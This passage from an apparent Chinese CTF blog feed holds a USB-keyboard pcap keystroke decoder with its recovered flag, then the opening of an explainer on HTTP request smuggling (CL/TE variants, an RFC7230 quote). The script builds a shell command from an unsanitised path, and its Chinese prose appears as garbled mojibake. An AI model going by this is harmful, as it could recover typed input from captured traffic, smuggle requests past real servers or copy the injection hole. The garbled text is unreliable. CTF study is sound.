class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br><br>presses = []<br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>        print(<span class="hljs-string">&quot;Usage : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span>)<br>        print(<span class="hljs-string">&quot;Tips : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        To use this python script , you must install the tshark first.&quot;</span>)<br>        print(<span class="hljs-string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span>)<br>        print(<span class="hljs-string">&quot;Author : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span>)<br>        print(<span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span>)<br>        print(<span class="hljs-string">&quot;        Thank you for using.&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-comment"># get data of pcap</span><br>    os.system(<span class="hljs-string">&quot;tshark -r %s -T fields -e usb.capdata &#x27;usb.data_len == 8&#x27; &gt; %s&quot;</span> % (pcapFilePath, DataFileName))<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            presses.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># handle</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> press <span class="hljs-keyword">in</span> presses:<br>        <span class="hljs-keyword">if</span> press == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">in</span> press:<br>            Bytes = press.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            Bytes = [press[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(press), <span class="hljs-number">2</span>)]<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += normalKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b10</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b100000</span>: <span class="hljs-comment"># shift key is pressed.</span><br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += shiftKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="hljs-number">0</span>]))<br>    print(<span class="hljs-string">&quot;[+] Found : %s&quot;</span> % (result))<br><br>    <span class="hljs-comment"># clean the temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€$ python3 UsbKeyboardDataHacker.py key.pcap                                                                                        1 â¨¯<br>[-] Unknow Key : 01<br>[-] Unknow Key : 01<br>[+] Found : aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;<br></code></pre></td></tr></table></figure><hr><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">https://blog.csdn.net/qq_45555226/article/details/102810474</a><br><a href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/108717829">https://blog.csdn.net/qq_43431158/article/details/108717829</a></p><p>CTFæµé‡åˆ†ææ€»ç»“é¢˜ç›®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://pan.baidu.com/s/1bGEIPeXDCbhybmWOyGr8Og<span class="hljs-comment">#list/path=%2F</span><br>æå–ç ï¼šq6ro<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æµé‡åˆ†æ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTPè¯·æ±‚èµ°ç§æ¼æ´</title>
    <link href="/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šHTTPè¯·æ±‚èµ°ç§æ¼æ´å­¦ä¹ </p> <a id="more"></a><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨åšä¸€é“é¢˜çš„æ—¶å€™ï¼Œåœ¨å¤§å¸ˆå‚…çš„wpä¸­å‘ç°å¯ä»¥åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ¼æ´ç»•è¿‡WAF,è”æƒ³åˆ°hgame2021ä¹Ÿæœ‰ç±»ä¼¼çš„é¢˜ï¼Œå½“æ—¶è¿wpéƒ½çœ‹ä¸æ‡‚ï¼Œç›´æ¥ä½¿ç”¨å®˜æ–¹wpçš„Payloadï¼Œä¹Ÿä¸èƒ½å¾—åˆ°ç»“æœï¼Œç°åœ¨æ¥æ€»ç»“ä¸€ä¸‹ã€‚</p><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>HTTPè¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ¥æ”¶çš„HTTPè¯·æ±‚åºåˆ—çš„æ–¹å¼çš„æŠ€æœ¯ã€‚è¯·æ±‚èµ°ç§æ¼æ´æœ¬è´¨ä¸Šé€šå¸¸å¾ˆå…³é”®ï¼Œå®ƒä½¿æ”»å‡»è€…å¯ä»¥ç»•è¿‡å®‰å…¨æ§åˆ¶ï¼Œæœªç»æˆæƒè®¿é—®æ•æ„Ÿæ•°æ®å¹¶ç›´æ¥å±å®³å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚</p><ul><li>åˆ©ç”¨Content-Lengthå­—æ®µæ¥åˆ¤å®šè¯·æ±‚ä½“çš„å†…å®¹é•¿åº¦ </li><li>åˆ©ç”¨Transfer-Encodingå­—æ®µæ¥åˆ¤å®šè¯·æ±‚ä½“çš„ç»“æŸä½ç½®</li></ul><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>Content-Lengthå³ä¸ºå®ä½“é•¿åº¦ã€‚æµè§ˆå™¨å¯ä»¥é€šè¿‡ Content-Length çš„é•¿åº¦ä¿¡æ¯ï¼Œåˆ¤æ–­å‡ºå“åº”å®ä½“å·²ç»“æŸã€‚é€šå¸¸å¦‚æœ Content-Length æ¯”å®é™…é•¿åº¦çŸ­ï¼Œä¼šé€ æˆå†…å®¹è¢«æˆªæ–­ï¼›å¦‚æœæ¯”å®ä½“å†…å®¹é•¿ï¼Œä¼šé€ æˆ pendingã€‚</p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>å†å²ä¸Š Transfer-Encoding å¯ä»¥æœ‰å¤šç§å–å€¼ï¼Œä½†æœ€æ–°çš„ HTTP è§„èŒƒé‡Œï¼Œåªå®šä¹‰äº†ä¸€ç§ä¼ è¾“ç¼–ç ï¼šåˆ†å—ç¼–ç ï¼ˆchunkedï¼‰ã€‚</p><p>åˆ†å—ç¼–ç ç›¸å½“ç®€å•ï¼Œåœ¨å¤´éƒ¨åŠ å…¥ Transfer-Encoding: chunked ä¹‹åï¼Œå°±ä»£è¡¨è¿™ä¸ªæŠ¥æ–‡é‡‡ç”¨äº†åˆ†å—ç¼–ç ã€‚è¿™æ—¶ï¼ŒæŠ¥æ–‡ä¸­çš„å®ä½“éœ€è¦æ”¹ä¸ºç”¨ä¸€ç³»åˆ—åˆ†å—æ¥ä¼ è¾“ã€‚æ¯ä¸ªåˆ†å—åŒ…å«åå…­è¿›åˆ¶çš„é•¿åº¦å€¼å’Œæ•°æ®ï¼Œé•¿åº¦å€¼ç‹¬å ä¸€è¡Œï¼Œé•¿åº¦ä¸åŒ…æ‹¬å®ƒç»“å°¾çš„ CRLFï¼ˆ\r\nï¼‰ï¼Œä¹Ÿä¸åŒ…æ‹¬åˆ†å—æ•°æ®ç»“å°¾çš„ CRLFã€‚æœ€åä¸€ä¸ªåˆ†å—é•¿åº¦å€¼å¿…é¡»ä¸º 0ï¼Œå¯¹åº”çš„åˆ†å—æ•°æ®æ²¡æœ‰å†…å®¹ï¼Œè¡¨ç¤ºå®ä½“ç»“æŸã€‚</p><h3 id="CLä¸TEè§£æä¼˜å…ˆçº§é¡ºåº"><a href="#CLä¸TEè§£æä¼˜å…ˆçº§é¡ºåº" class="headerlink" title="CLä¸TEè§£æä¼˜å…ˆçº§é¡ºåº"></a>CLä¸TEè§£æä¼˜å…ˆçº§é¡ºåº</h3><p>CLè¡¨ç¤ºContent-Lengthï¼ŒTEè¡¨ç¤ºTransfer-Encodingã€‚</p><p>ä¼˜å…ˆçº§é¡ºåºè¯¦è§ <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3 </a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">If</span> a message <span class="hljs-keyword">is</span> received <span class="hljs-keyword">with</span> <span class="hljs-keyword">both</span> a Transfer-<span class="hljs-keyword">Encoding</span> <span class="hljs-keyword">and</span> a<br>Content-Length <span class="hljs-keyword">header</span> field, the Transfer-<span class="hljs-keyword">Encoding</span> overrides the<br>Content-Length. Such a message might indicate an attempt <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span><br>request smuggling (Section <span class="hljs-number">9.5</span>) <span class="hljs-keyword">or</span> response splitting (Section <span class="hljs-number">9.4</span>)<br><span class="hljs-keyword">and</span> ought <span class="hljs-keyword">to</span> be handled <span class="hljs-keyword">as</span> an error. A sender MUST remove the received Content-Length field prior <span class="hljs-keyword">to</span> forwarding such a message downstream.<br></code></pre></td></tr></table></figure><p>TE ä¼˜å…ˆäº CL ï¼Œä½†å¯ä»¥é€šè¿‡ä¸€äº›æ–¹å¼ç»•è¿‡</p><h2 id="è¯·æ±‚èµ°ç§åˆ†ç±»"><a href="#è¯·æ±‚èµ°ç§åˆ†ç±»" class="headerlink" title="è¯·æ±‚èµ°ç§åˆ†ç±»"></a>è¯·æ±‚èµ°ç§åˆ†ç±»</h2><p>è¯·æ±‚èµ°ç§æ”»å‡»åŒ…æ‹¬å°†Content-Lengthæ ‡å¤´å’ŒTransfer-Encoding æ ‡å¤´éƒ½æ”¾å…¥å•ä¸ªHTTPè¯·æ±‚ä¸­å¹¶è¿›è¡Œå¤„ç†ï¼Œä»¥ä¾¿å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¯·æ±‚ã€‚å®Œæˆæ­¤æ“ä½œçš„ç¡®åˆ‡æ–¹å¼å–å†³äºä¸¤ä¸ªæœåŠ¡å™¨çš„è¡Œä¸ºï¼š</p><ul><li>CLä¸ä¸º0:å‰ç«¯ä»£ç†æœåŠ¡å™¨å…è®¸è¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¸å…è®¸è¯·æ±‚æºå¸¦è¯·æ±‚ä½“ã€‚</li><li>CL-CLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingå¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthå¤´ã€‚</li><li>CL-TEï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer- Encodingæ ‡å¤´ã€‚</li><li>TE-TEï¼šå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æŸç§æ–¹å¼æ··æ·†æ ‡å¤´æ¥è¯±å¯¼å…¶ä¸­ä¸€å°æœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚</li><li>TE-CLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingå¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthå¤´ã€‚</li></ul><h3 id="CLä¸ä¸º0"><a href="#CLä¸ä¸º0" class="headerlink" 